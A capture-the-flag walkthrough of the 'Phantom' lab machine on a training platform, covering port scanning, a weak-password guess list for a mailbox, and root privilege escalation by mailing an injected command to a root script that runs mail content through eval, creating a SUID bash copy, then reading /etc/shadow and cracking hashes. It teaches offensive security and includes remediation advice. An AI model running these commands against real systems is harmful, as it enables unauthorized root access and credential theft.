---
title: "Phantom — Ulfr Labs (NESTCON) Walkthrough"
author: "Sampson Quarmy Sokpoli (@_0xh4sh)"
date: ""
---

# Phantom — HTB-style Walkthrough (Ulfr Labs / NESTCON)

**Difficulty:** Easy &nbsp;|&nbsp; **OS:** Linux &nbsp;|&nbsp; **Platform:** Ulfr Labs (NESTCON) &nbsp;|&nbsp; **Creator:** ghost

---

## Disclaimer

This walkthrough documents a machine solved on **Ulfr Labs**, a legal, sandboxed training platform (part of NESTCON) built for practising offensive security skills. All activity described here was performed inside the lab's VPN-isolated environment against a machine the author was explicitly authorised to attack.

Do not attempt any of these techniques against systems you do not own or do not have **written permission** to test. The target IP address changes between lab resets, so it is referenced throughout as `<TARGET_IP>` — substitute your own assigned IP when you follow along.

> **For instructors / students:** This document is written as a teaching walkthrough. Each phase explains *what* was done, *why* it was done, and *what to look for*, so a newcomer can reproduce the path without getting stuck — not just a list of commands.

---

## Box Summary

| Field | Value |
|---|---|
| Name | Phantom |
| Difficulty | Easy |
| OS | Linux |
| User flag reward | 10 marks |
| System (root) flag reward | 20 marks |
| Key techniques | WHOIS enumeration, mail service abuse (POP3/IMAP), mail-triggered command execution, SUID shell escalation |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning & service enumeration |
| `whois` | Querying the exposed internal WHOIS service on port 43 |
| `openssl s_client` / mail client (Dovecot POP3/IMAP) | Reading mail from the exposed mailbox |
| `ssh` | Remote shell access as low-privilege user |
| `mail` (mailutils/bsd-mailx) | Sending a crafted email to trigger the root-side automation |
| `john` (John the Ripper) | Offline password hash cracking |

---

## Methodology Overview

A standard black-box methodology was followed, mirroring how a professional penetration tester would approach an unknown host:

1. **Reconnaissance** — identify open ports and exposed services.
2. **Enumeration** — interrogate each service for information disclosure.
3. **Initial Access** — use discovered credentials to get a foothold.
4. **Privilege Escalation** — identify and abuse a misconfigured automation.
5. **Post-Exploitation** — capture flags and evidence, document findings.

---

## Phase 1 — Reconnaissance

Start with a full TCP port scan to avoid missing anything non-standard, then follow up with service/version detection on the discovered ports.

```bash
# Full port sweep (all 65535 TCP ports)
nmap -p- -T4 -oN nmap/full-scan.txt <TARGET_IP>

# Service/version + default script scan on discovered ports
nmap -sC -sV -p 22,43,110,143,993,995 -oN nmap/detail.nmap <TARGET_IP>
```

**Findings:**

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH | Standard remote access |
| 43 | WHOIS | Internal WHOIS server exposing domain registration data for `phantom.ulfr` |
| 110 / 995 | POP3 / POP3S | Dovecot mail retrieval |
| 143 / 993 | IMAP / IMAPS | Dovecot mail retrieval |

A WHOIS service running on an internal box is unusual and immediately stands out as the intended entry point — on real engagements, anything that deviates from a "normal" host profile like this deserves a closer look first.

---

## Phase 2 — Enumeration

### 2.1 Querying the internal WHOIS service

Port 43 is the standard WHOIS port. Query it directly for the domain referenced by the box name:

```bash
whois -h <TARGET_IP> -p 43 "phantom.ulfr"
```

This returned a WHOIS record for the internal domain `phantom.ulfr`, which disclosed an **administrative contact email address**:

```
sysadmin@phantom.ulfr
```

> **Why this matters:** WHOIS records are often treated as "just metadata," but on internal/lab infrastructure they frequently leak usernames, email addresses, or naming conventions that feed directly into the next stage of enumeration. Always read every field, not just the ones you expect to be interesting.

### 2.2 Enumerating the mail services

With a valid mailbox name in hand, enumerate what the mail services will allow:

```bash
nmap -p110,143,993,995 --script="pop3-capabilities,imap-capabilities" -sV <TARGET_IP>
```

This confirms Dovecot is running and lists the supported authentication mechanisms (useful to know whether plaintext login, STARTTLS, or SASL is required).

### 2.3 Accessing the mailbox

Using the address recovered from WHOIS, the mailbox for `sysadmin@phantom.ulfr` was accessed over IMAP/POP3:

```bash
# IMAP, interactively, to inspect what's available
openssl s_client -connect <TARGET_IP>:993 -quiet
```

No credential for this mailbox was disclosed anywhere else on the box (WHOIS, banners, etc.), so the way in was simple **credential guessing against the `sysadmin` account** — trying a short list of common default/weak passwords administrators are prone to reusing, rather than anything exotic:

```
sysadmin
admin
root
password
```

If you're following along, don't stop at those four — a mailbox like this is exactly the kind of place a short, sensible wordlist pays off. Worth trying in the same spirit:

```
admin123
changeme
welcome1
letmein
Password1
```

> **Try it yourself first.** The working password is not stated here on purpose — this is meant to be a hands-on exercise in credential guessing, not a copy-paste answer. If none of the above land on your instance, widen the list (common Dovecot/webmail defaults, the domain name itself, seasonal/year patterns, etc.) before reaching for a full wordlist + `hydra`/`medusa` against the IMAP/POP3 service.

Once authenticated, an email in the inbox disclosed freshly provisioned SSH credentials for a user named `james`.

> **Credentials intentionally omitted.** The actual username/password pair is not reproduced here on purpose. This walkthrough is meant to teach the *process* — find the mailbox, read what's in it, recognise provisioned credentials when you see them — not to hand students a working login. Anyone following along should locate the real values themselves in their own lab instance.

---

## Phase 3 — Initial Foothold

With valid credentials, connect over SSH:

```bash
ssh james@<TARGET_IP>
```

Once logged in, retrieve the **user flag**. It sits at `/home/james/user.txt`, owned by `james` with normal user permissions — no privilege escalation is required to read it, so grab it before moving on to root. Then begin local enumeration:

```bash
id
sudo -l
cat /etc/crontab
ls -la /etc/cron.d/ /opt /usr/local/bin 2>/dev/null
ps aux
```

This local enumeration step is the piece that turns "I got a shell" into "I understand the box" — it's what led to the privilege-escalation vector below, and it's worth doing methodically rather than jumping straight to known exploits.

---

## Phase 4 — Privilege Escalation

### 4.1 Discovering the mail-triggered automation

Since the whole box is themed around mail, local enumeration was focused accordingly — searching the filesystem for anything referencing it rather than enumerating blindly:

```bash
find / -iname "*mail*" 2>/dev/null
```

This surfaced a script in `/opt`:

```bash
james@phantom-build:/opt$ ls -l mail-processor.sh
-rwxr-xr-x 1 root root 377 Oct 12 09:47 mail-processor.sh

james@phantom-build:/opt$ cat mail-processor.sh
```

```bash
#!/bin/bash
MAILBOX="/var/mail/root"
LOCK="/tmp/.mail-proc.lock"

[ -f "$LOCK" ] && exit 0
touch "$LOCK"

if [ -s "$MAILBOX" ]; then
    while IFS= read -r line; do
        if [ "$line" = "[SYSCTL]" ]; then
            read -r cmd
            if [ -n "$cmd" ]; then
                eval "$cmd"
            fi
        fi
    done < "$MAILBOX"
    > "$MAILBOX"
fi

rm -f "$LOCK"
```

The file is **owned by root** (`-rwxr-xr-x root root`) and world-readable/executable, which is consistent with it running under root's privileges — though the exact scheduling mechanism (cron, a systemd timer, etc.) wasn't confirmed on this run. If you want that final link nailed down for the write-up, check `crontab -l -u root`, `ls /etc/cron.d`, and `systemctl list-timers` next time you're on the box.

Reading the script line by line explains the exact trigger condition used earlier:

- It reads root's local mailbox (`/var/mail/root`) line by line.
- Any line that is **exactly** `[SYSCTL]` puts it into "command mode" for one line.
- The very next line is passed straight into `eval`, with **no sanitisation, allow-listing, or authentication check** of any kind.
- A lock file prevents the script overlapping with itself, and the mailbox is truncated (`> "$MAILBOX"`) after each pass.

This is a textbook **insecure automation / command injection via mail content** vulnerability: a privileged background process trusts unauthenticated, unsanitised input (the body of an email) as executable shell code via `eval`. Anyone who can get a message into root's mailbox — which, on this box, meant anyone who could run the `mail` command as any local user — can run arbitrary commands as root.

#### A dead end worth documenting: `/opt/ulfr/inject-flag.sh`

The same `find` turned up a second script in a neighbouring directory:

```bash
james@phantom-build:/opt/ulfr$ ls -l inject-flag.sh
-rwxr-xr-x 1 root root 267 Oct 12 10:17 inject-flag.sh

james@phantom-build:/opt/ulfr$ cat inject-flag.sh
```

```bash
#!/bin/bash
if [ -n "$FLAG_USER" ]; then
    echo "$FLAG_USER" > /home/james/user.txt
    chown james:james /home/james/user.txt
    chmod 644 /home/james/user.txt
fi
if [ -n "$FLAG_ROOT" ]; then
    echo "$FLAG_ROOT" > /root/root.txt
    chmod 600 /root/root.txt
fi
```

This was investigated and attempted, but it led nowhere — it's the **lab platform's own flag-seeding script**, writing `user.txt`/`root.txt` from environment variables (`$FLAG_USER`/`$FLAG_ROOT`) that get set when the box is provisioned, not something an unprivileged user can trigger productively. It isn't part of the intended exploitation path and isn't required to reach root.

It's included here anyway for two reasons that are worth modelling in any writeup: first, documenting a dead end you actually tried (rather than silently omitting it) is standard practice in a professional report — it shows the exploration was systematic, not lucky. Second, it independently **confirms the flag locations** referenced throughout this document (`/home/james/user.txt`, `/root/root.txt`), which lines up with where CTF-style flags are placed by convention anyway.

### 4.2 Exploiting the mail-triggered execution

Craft a payload that copies `/bin/bash` to a world-writable location and sets the SUID bit, so executing it later drops a root-privileged shell:

```bash
echo -e "[SYSCTL]\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" \
  | mail -s "System Update" root
```

In testing, the automation picked up and processed the mail almost immediately — check for the new binary right away rather than assuming you need to wait:

```bash
ls -la /tmp/rootbash
```

### 4.3 Escalating to root

```bash
/tmp/rootbash -p
```

The `-p` flag tells bash to preserve the effective UID/GID from the SUID bit rather than dropping privileges on startup — without it, bash silently drops back to your real UID and the shell is *not* root, which is a common trip-up for newcomers trying this technique for the first time.

Confirm root:

```bash
id
```

Retrieve the **system (root) flag** at `/root/root.txt`.

---

## Phase 5 — Post-Exploitation / Evidence

With root access, extract the shadow file for completeness of evidence:

```bash
cat /etc/shadow
```

> **Hash intentionally omitted.** The root password hash captured from `/etc/shadow` is not reproduced here. Showing it would let a reader skip straight to offline cracking without ever doing the enumeration and exploitation steps above — which defeats the point of a *guided* walkthrough. Save your own copy of the hash locally (e.g. as `roothash`) once you've reached this point on your own instance.

An offline cracking attempt was made for completeness/validation:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt roothash
```

> This step isn't required to own root (you already have a root shell via the SUID binary) — it's included here purely as a verification/reporting exercise, which is common practice when writing up a finding: it demonstrates password strength (or weakness) as part of the report, separate from the exploitation path itself.

---

## What Could Have Been Done Better (Process Notes for Students)

A few corrections/improvements worth calling out, both for accuracy and to model good practice:

1. **Scan order:** running the full `-p-` sweep *before* the targeted `-sC -sV` scan (as shown above) is safer than guessing ports up front — don't skip straight to a handful of "likely" ports on a real engagement.
2. **Verify before you trigger a privileged automation blindly.** Before sending a command for root to execute via the mail trigger, confirm exactly what the watcher script does with the input (read the script if you have read access) rather than assuming the tag format from a hunch. On a real client engagement, blindly triggering root-level command execution without understanding the automation first is a good way to cause unintended damage.
3. **Minimise footprint.** Dropping a SUID copy of `/bin/bash` into `/tmp` is a standard technique, but on a real assessment it should be removed at the end of the engagement (`rm -f /tmp/rootbash`) and noted in the report rather than left behind.
4. **Don't leave extracted hashes lying around in plaintext files** (`roothash`) on your own attacking machine longer than needed — treat captured credential material with the same handling care you'd expect a client to apply to it.
5. **Cite your evidence.** Every claim in a professional report (e.g. "a mail-watcher script runs as root") should point to the specific file, command output, or screenshot that proves it — the two "verify" notes above exist precisely so this write-up meets that bar once you fill them in from your own session notes.

---

## Remediation Recommendations (Defender's View)

Since this is also meant to train students in *reporting*, here's how these findings would be written up for a client:

| Finding | Risk | Recommendation |
|---|---|---|
| WHOIS service (port 43) exposes internal contact/domain data | Low–Medium | Disable or restrict the internal WHOIS service to trusted management networks only |
| Mail service permits access leading to credential disclosure in message body | High | Never transmit credentials in plaintext email; rotate any credential that has been emailed; enforce strong/unique mailbox authentication |
| Root-level automation executes commands sourced from unauthenticated mail content | Critical | Remove the automation entirely, or redesign it to never execute arbitrary content from a mail body; if automation must act on mail, use a strict allow-list and run as an unprivileged service account, never root |
| SSH account `james` uses a weak, guessable-pattern password | Medium | Enforce a password policy / move to key-based authentication only |

---

## Appendix — Command Cheat-Sheet

```bash
# Recon
nmap -p- -T4 -oN nmap/full-scan.txt <TARGET_IP>
nmap -sC -sV -p 22,43,110,143,993,995 -oN nmap/detail.nmap <TARGET_IP>

# Enumeration
whois -h <TARGET_IP> -p 43 "phantom.ulfr"
nmap -p110,143,993,995 --script="pop3-capabilities,imap-capabilities" -sV <TARGET_IP>
openssl s_client -connect <TARGET_IP>:993 -quiet

# Foothold
ssh james@<TARGET_IP>

# Local enumeration
sudo -l
cat /etc/crontab
ls -la /etc/cron.d/ /opt /usr/local/bin
ps aux
find / -iname "*mail*" 2>/dev/null

# Privilege escalation
echo -e "[SYSCTL]\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" | mail -s "System Update" root
/tmp/rootbash -p

# Evidence / verification
cat /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt roothash

# Cleanup (do this before closing out the engagement)
rm -f /tmp/rootbash
```

---

## References

- Ulfr Labs (NESTCON): <https://ulfr.nestcon.live/>
- NESTCON: <https://www.nestcon.live/>

---

**Author:** Sampson Quarmy Sokpoli &nbsp;·&nbsp; **Handle:** `@_0xh4sh`
